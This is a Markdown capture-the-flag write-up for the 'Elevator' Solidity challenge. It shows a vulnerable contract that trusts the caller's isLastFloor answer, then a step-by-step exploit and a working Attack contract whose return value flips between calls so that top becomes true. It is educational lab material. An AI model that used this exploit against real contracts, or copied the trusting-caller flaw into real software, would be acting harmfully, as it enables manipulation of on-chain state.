<div align="center">

# Elevator

</div>



**Elevator (Vulnerable Code) :**


<details>
<summary>Code</summary>

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

```

</details>

---------

**Approach and Exploit Method Including Code :** 


1. **Understand the contract**

 - `Elevator` exposes `goTo(uint256 _floor)` which does:
  - Casts the caller to `Building`: `Building building = Building(msg.sender);`
  - Calls `building.isLastFloor(_floor)`. If that returns `false`, it sets `floor = _floor` and then sets `top = building.isLastFloor(floor)`.
- **Key idea:** `Elevator` trusts the **caller** (via `msg.sender`) to correctly answer `isLastFloor`. A malicious caller can return different values on each call (it's not `view`), so the contract's logic can be manipulated.
- Analogy: Elevator asks the building "is this the top floor?" twice and just trusts whatever the building (caller) tells it — but a hostile building can lie.

2. **Exploit Method**

    i. Deploy an attack contract that implements `isLastFloor(uint)` and flips its return:
    - Return `false` the first time, `true` the second time (use a counter stored in the attacker contract).

    ii. Deploy/attach the `Attack` contract with the `Elevator` instance address.

    iii. Call the attack function that does `target.goTo(1)` from the `Attack` contract. Because `msg.sender` (the caller) is the attack contract, `Elevator` will call `Attack.isLastFloor(1)` twice:
    - First call returns `false` → `Elevator` sets `floor = 1`.
    - Second call returns `true` → `Elevator.top` becomes `true`.

    iv. Verify success:
    - `await elevator.top()` (or call `elevator.top()` in your console) — it should now be `true`.

    **One-line summary:** make a caller contract that lies on the first `isLastFloor` call and tells the truth on the second — then call `goTo(...)` via that contract so `Elevator` sets `top = true`.



## Exploit Code

```Solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


contract Attack{
    Elevator private immutable target;
    uint private count;
    constructor (address _target){
        target = Elevator(_target);
    }
    function toggle()external {
        target.goTo(1);
        require(target.top(), "not top");
    }

    function isLastFloor(uint) external returns  (bool){
        count++;
        return  count > 1;

    }
    
}


```

---


